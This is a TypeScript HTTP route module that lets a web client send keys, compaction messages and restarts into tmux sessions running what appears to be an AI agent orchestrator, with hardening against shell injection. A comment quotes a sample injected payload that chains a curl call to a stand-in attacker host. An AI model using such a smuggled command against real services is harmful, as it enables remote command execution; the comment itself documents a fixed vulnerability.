import { Hono } from "hono";
import { execFile, spawn } from "node:child_process";
import { promisify } from "node:util";
import { execAsync, resolveTargetSession, sendToTmux, tmuxSessionExists, TMUX_SESSION } from "../utils.js";
import { getTracer } from "../../lib/otel.js";
import { SpanStatusCode } from "@opentelemetry/api";

const execFileAsync = promisify(execFile);

const TMUX_TIMEOUT_MS = 5_000;
// How long to wait for a detached cold start to make the session appear.
// cw-launch's `tmux new-session -d` returns near-instantly; we are NOT waiting
// for the agent to finish booting (see COLD START below).
const COLD_START_CONFIRM_MS = 5_000;
const COLD_START_POLL_MS = 250;

// The pane option cw-launch stamps on the orchestrator's pane at creation
// (claudes-world abb7d11). This is the ONLY sanctioned way to find that pane.
//
// Never target it positionally. `renumber-windows` is on globally on this host,
// so when a window dies the next one is promoted into its index: `session:1.1`
// means "whatever currently occupies slot 1", not "the pane cw-launch created".
// Two separate wrong-kill bugs came from positional targeting (PR #335 rounds
// 1+2) — each killed a bystander pane, left the orchestrator running, and still
// reported ok:true. Role lookup fails LOUD instead: no tagged pane means no
// candidate, so we never -k something we cannot prove is the orchestrator.
const ORCHESTRATOR_ROLE = "orchestrator";

// The canonical orchestrator launcher (attach-or-start). CPC must never
// reconstruct the claude command itself: the previous hardcoded copy silently
// drifted from cw-launch (wrong cwd, retired channel plugin, no WOS_* env) and
// shipped restarts into a stale session for weeks (WORLD-415). Absolute by
// default because the systemd unit's PATH does not include claudes-world/bin.
//
// Scope, precisely: this launcher is authoritative for the COLD-START branch
// only. The respawn branch replays the pane's creation-time command, so an
// edit to cw-launch does not reach a session that is already running — only a
// full kill picks it up. That is still strictly better than the old code,
// which rebuilt a known-stale command every time.
const CW_LAUNCH = process.env.CW_LAUNCH_BIN || "/home/claude/claudes-world/bin/cw-launch";

const tmuxTracer = getTracer('cpc-server-tmux');

/**
 * Find the orchestrator's pane by ROLE. Returns its unique pane id (`%183`),
 * or null when no pane claims the role — which means the orchestrator is not
 * running, whatever the session's own liveness says. A session outlives its
 * windows: an SSH tab alone keeps it alive after the agent's window is gone.
 *
 * Pane ids are used deliberately: they are stable for a pane's whole life and
 * are never reused or renumbered, unlike `session:window.pane`.
 */
async function orchestratorPane(session: string): Promise<string | null> {
  const { stdout } = await execFileAsync(
    "tmux",
    // pane_id FIRST: @cpc-role is a user-settable option whose value may contain
    // spaces, so it has to be the trailing field or it shifts the parse. (With
    // role first, `@cpc-role="orchestrator x"` yields paneId="x".) Pane ids never
    // contain spaces, so token 0 is always unambiguous and the role is the rest.
    ["list-panes", "-s", "-t", `=${session}`, "-F", "#{pane_id} #{@cpc-role}"],
    { timeout: TMUX_TIMEOUT_MS },
  );
  const tagged = stdout
    .split("\n")
    .map((line) => line.trim())
    .filter(Boolean)
    .map((line) => {
      const [paneId, ...role] = line.split(" ");
      return { paneId, role: role.join(" ") };
    })
    .filter((p) => p.paneId && p.role === ORCHESTRATOR_ROLE);

  // Ambiguity fails loud. Nothing legitimate produces two orchestrators in one
  // session — cw-launch tags exactly one pane and splits do not inherit pane
  // options (verified). If it happens anyway, something is wrong that we cannot
  // reason about, and guessing is how this endpoint shipped three wrong-kills.
  if (tagged.length > 1) {
    throw new Error(
      `ambiguous: ${tagged.length} panes claim @cpc-role=${ORCHESTRATOR_ROLE} in tmux session ${session}` +
        ` (${tagged.map((p) => p.paneId).join(", ")}) — refusing to guess which is the orchestrator`,
    );
  }
  return tagged[0]?.paneId ?? null;
}

/**
 * COLD START — create-only, never destructive. Reached only when no pane claims
 * the orchestrator role, i.e. there is nothing qualifying to kill.
 *
 * Detached on purpose. cw-launch ends with `exec cw-boot-confirm`, which polls
 * for up to 300s dismissing boot dialogs and injecting the kickoff. Holding the
 * HTTP request open for that is untenable, and killing it on a timeout is worse:
 * `tmux new-session -d` has already succeeded by then, so we would strand a
 * half-booted session behind a dialog — and a retry would find the session live,
 * take the respawn branch, and never re-run boot-confirm. Unrecoverable without
 * SSH. So: detach, let boot-confirm finish on its own, and only wait long enough
 * to confirm the session actually came up. cw-launch is idempotent, so a racing
 * second press is harmless.
 */
async function coldStartDetached(session: string): Promise<void> {
  const child = spawn(CW_LAUNCH, [], { detached: true, stdio: "ignore" });
  child.unref();

  // Confirm on the TAGGED PANE, never on the session. The session existing does
  // not mean the orchestrator is running — that false proxy is the whole bug
  // this endpoint keeps re-learning. It bites here specifically: cw-launch is
  // attach-or-start, so if the session is alive but the orchestrator's window
  // died (an SSH tab holding it open), cw-launch no-ops and starts nothing. A
  // session-existence check would call that success and report a cold start
  // that never happened.
  const deadline = Date.now() + COLD_START_CONFIRM_MS;
  while (Date.now() < deadline) {
    if ((await tmuxSessionExists(session)) && (await orchestratorPane(session))) return;
    await new Promise((resolve) => setTimeout(resolve, COLD_START_POLL_MS));
  }
  // Honest failure. The common cause is the case above: an occupied session
  // with no orchestrator. cw-launch cannot fix that without killing the
  // session, and a restart must never kill panes it cannot identify — so this
  // needs a human, and says so rather than reporting a phantom success.
  throw new Error(
    `cold start did not produce an orchestrator pane in tmux session ${session}` +
      ` (if the session is alive but has no @cpc-role=${ORCHESTRATOR_ROLE} pane,` +
      ` cw-launch will no-op — recover it manually)`,
  );
}

async function tracedTmux<T>(
  spanName: string,
  session: string,
  commandType: string,
  fn: () => Promise<T>
): Promise<T> {
  const span = tmuxTracer.startSpan(spanName, {
    attributes: { 'tmux.session': session, 'tmux.command_type': commandType },
  });
  try {
    return await fn();
  } catch (err) {
    span.recordException(err instanceof Error ? err : String(err));
    span.setStatus({ code: SpanStatusCode.ERROR });
    throw err;
  } finally {
    span.end();
  }
}

const app = new Hono();

/**
 * Allowlist regex for raw tmux key tokens. A raw `send-keys` call accepts
 * things like `Escape`, `BTab`, `Up`, `Down`, `C-a`, `M-Left`, `S-F1` — all
 * of which fit `^[A-Za-z][A-Za-z0-9_-]*$`. Anything else (shell metachars,
 * whitespace other than the single-space token separator, semicolons, backticks,
 * subshells, etc.) is rejected with 400.
 *
 * Space-separated multi-key strings are allowed (tmux supports
 * `send-keys Escape Up Up`) but each token must independently match. The split
 * happens on `\s+` so the shell can never see a metachar.
 *
 * Security rationale: the previous implementation wired `body.keys` directly
 * into `tmux send-keys -t <session> <keys>` via `exec()`, which spawns
 * `/bin/sh -c` and interprets the whole string as a shell command. A POST
 * containing `{"raw":true,"keys":"Escape; curl evil.example"}` would execute
 * the curl as the `claude` user. The new implementation routes through
 * `execFile` with an argv array (no shell) AND enforces the token allowlist
 * so even a future regression in execFile cannot leak shell metacharacters to
 * tmux's own key parser.
 */
const RAW_KEY_TOKEN = /^[A-Za-z][A-Za-z0-9_-]*$/;

/**
 * Resolve the optional `session` body field shared by the restricted
 * command palette endpoints (send-keys / compact / reload-plugins — the
 * fixed verb set Liam wants usable against ANY fleet session, voice msg
 * 1188). Returns the validated target session name, or a Response already
 * sent to the client (400 bad name / 404 unknown session).
 *
 * The default session skips the existence probe on purpose — legacy
 * behavior lets commands race a /restart-session recreate, and tmux's own
 * error still surfaces as a 500 if it's truly gone. A client-picked
 * session, by contrast, must exist before we send keys anywhere near it.
 *
 * NOT wired into /restart-session or /resize-terminal: those stay
 * default-session-only by design (restart respawns the orchestrator's own
 * pane, and falls back to the orchestrator-specific cw-launch; resize has
 * the window-size latch side effect) — the palette never offers them for
 * other sessions, and the UI hides them while a non-default session is
 * being viewed (ActionBar.tsx, `restrictedSession`).
 */
async function resolvePaletteTarget(c: any, body: any): Promise<{ session: string } | { response: Response }> {
  const target = resolveTargetSession(body?.session);
  if (!target.ok) {
    return { response: c.json({ ok: false, error: target.error }, 400) };
  }
  if (target.session !== TMUX_SESSION && !(await tmuxSessionExists(target.session))) {
    return { response: c.json({ ok: false, error: "unknown session" }, 404) };
  }
  return { session: target.session };
}

// Control chars (C0 + DEL) in a literal `send-keys` payload act as submit /
// command separators in the target terminal — a single newline turns one
// "verb" into two submitted lines. For a NON-default (restricted) session —
// one reached through the restricted palette, which DOES allow gated
// single-line free text (Option A, Liam msg 1607) — that would let a
// compaction message or key string smuggle EXTRA commands past the one the
// user actually submitted, so literal payloads to non-default sessions must
// be single-line. This bounds each action to one line; it is not a view-only
// restriction. The default session (Liam's own, writable) intentionally
// keeps multi-line steering — e.g. the "/fork\n/rename" flow relies on an
// embedded newline.
const LITERAL_CONTROL_CHAR_RE = /[\x00-\x1f\x7f]/;

/** True when a literal payload must be rejected for the given target: a
 *  non-default session may only receive single-line, control-char-free text. */
function isDisallowedNonDefaultLiteral(session: string, payload: string): boolean {
  return session !== TMUX_SESSION && LITERAL_CONTROL_CHAR_RE.test(payload);
}

app.post("/send-keys", async (c) => {
  try {
    const body = await c.req.json();
    const keys = body.keys;
    if (!keys || typeof keys !== "string") {
      return c.json({ ok: false, error: "keys required" }, 400);
    }
    const resolved = await resolvePaletteTarget(c, body);
    if ("response" in resolved) return resolved.response;
    const session = resolved.session;
    if (body.raw) {
      // Split on whitespace and validate each token against the allowlist.
      // Reject empty-after-split (e.g. all whitespace input) so we never call
      // tmux with zero key args.
      const tokens = keys.split(/\s+/).filter(Boolean);
      if (tokens.length === 0) {
        return c.json({ ok: false, error: "keys required" }, 400);
      }
      for (const tok of tokens) {
        if (!RAW_KEY_TOKEN.test(tok)) {
          return c.json(
            { ok: false, error: `invalid raw key token: ${tok}` },
            400,
          );
        }
      }
      // execFile with argv — no shell, no interpolation. `=` prefix:
      // exact-match session lookup (the target can be client-picked).
      await tracedTmux('tmux.send-keys', session, 'raw', () =>
        execFileAsync("tmux", ["send-keys", "-t", `=${session}:`, ...tokens])
      );
    } else {
      // A non-default (restricted) session must not receive a multi-line
      // literal payload: an embedded newline submits an extra command line
      // beyond the single line the user meant (PR #306 R3). Free single-line
      // text IS allowed (Option A); execFile already blocks shell injection;
      // this blocks command *chaining* at the tmux layer.
      if (isDisallowedNonDefaultLiteral(session, keys)) {
        return c.json({ ok: false, error: "non-default sessions accept single-line keys only" }, 400);
      }
      // Literal text — use execFile (no shell) with `-l` and `--` so user
      // input cannot inject via $(...) or backticks. The previous execAsync
      // path spawned /bin/sh -c on an interpolated string; JSON.stringify
      // only quotes for JS, NOT for shells, so `$(...)` and backticks in the
      // keys survived the quote and were executed by sh BEFORE tmux saw them.
      await tracedTmux('tmux.send-keys', session, 'literal', async () => {
        await execFileAsync("tmux", ["send-keys", "-t", `=${session}:`, "-l", "--", keys]);
        await execFileAsync("tmux", ["send-keys", "-t", `=${session}:`, "Enter"]);
      });
    }
    return c.json({ ok: true, action: "send-keys" });
  } catch (err: any) {
    return c.json({ ok: false, error: err.message }, 500);
  }
});

app.post("/compact", async (c) => {
  try {
    const body = await c.req.json();
    const message = body.message as string;
    if (!message) return c.json({ ok: false, error: "message required" }, 400);
    const resolved = await resolvePaletteTarget(c, body);
    if ("response" in resolved) return resolved.response;
    const session = resolved.session;

    // A non-default (restricted) session must not receive a multi-line
    // compaction message: an embedded newline submits an extra command line
    // beyond the one the user meant (PR #306 R3, superseding the bypassable
    // "/compact"-prefix check — `\s` matched `\n`). The single-line message
    // itself is intentionally free text (Option A, Liam msg 1607), bounded by
    // Telegram auth; the durable confirm-gated steering design is #241 phase-2.
    if (isDisallowedNonDefaultLiteral(session, message)) {
      return c.json({ ok: false, error: "non-default sessions accept single-line messages only" }, 400);
    }

    // Send via tmux send-keys — execFile (no shell) with -l + -- so the
    // user-provided message cannot inject via $(...) or backticks.
    await tracedTmux('tmux.compact', session, 'compact', async () => {
      await execFileAsync("tmux", ["send-keys", "-t", `=${session}:`, "-l", "--", message]);
      await execFileAsync("tmux", ["send-keys", "-t", `=${session}:`, "Enter"]);
    });
    return c.json({ ok: true, action: "compact" });
  } catch (err: any) {
    return c.json({ ok: false, error: err.message }, 500);
  }
});

app.post("/reload-plugins", async (c) => {
  try {
    // Body is optional here (legacy clients POST with no body at all).
    const body = await c.req.json().catch(() => ({}));
    const resolved = await resolvePaletteTarget(c, body);
    if ("response" in resolved) return resolved.response;
    const session = resolved.session;
    await tracedTmux('tmux.send-keys', session, 'reload-plugins', () =>
      sendToTmux("/reload-plugins", session)
    );
    return c.json({ ok: true, action: "reload-plugins" });
  } catch (err: any) {
    return c.json({ ok: false, error: err.message }, 500);
  }
});

app.post("/restart-session", async (c) => {
  try {
    const path = await tracedTmux('tmux.restart-session', TMUX_SESSION, 'restart-session', async () => {
      // Ask for the role-tagged pane, not the session: the session can outlive
      // the orchestrator's own window, so its liveness proves nothing here.
      const pane = (await tmuxSessionExists(TMUX_SESSION))
        ? await orchestratorPane(TMUX_SESSION)
        : null;

      if (pane) {
        // Re-runs the pane's own creation-time command, keeping its cwd, its
        // WOS_* env and any attached viewers.
        await execFileAsync("tmux", ["respawn-pane", "-k", "-t", pane], { timeout: TMUX_TIMEOUT_MS });
        return "respawned-tagged-pane" as const;
      }

      await coldStartDetached(TMUX_SESSION);
      return "cold-started-fresh" as const;
    });
    // Report WHICH path ran: the two outcomes differ enough that the UI must
    // not present them identically — a cold start is a brand-new session, not
    // a resumed one.
    return c.json({ ok: true, action: "restart-session", path });
  } catch (err: any) {
    return c.json({ ok: false, error: err.message }, 500);
  }
});

app.post("/resize-terminal", async (c) => {
  try {
    await tracedTmux('tmux.resize-terminal', TMUX_SESSION, 'resize-terminal', () =>
      execAsync(`tmux resize-window -t ${TMUX_SESSION} -A`)
    );
    return c.json({ ok: true, action: "resize-terminal" });
  } catch (err: any) {
    return c.json({ ok: false, error: err.message }, 500);
  }
});

export { app as slashCommandsRoute };
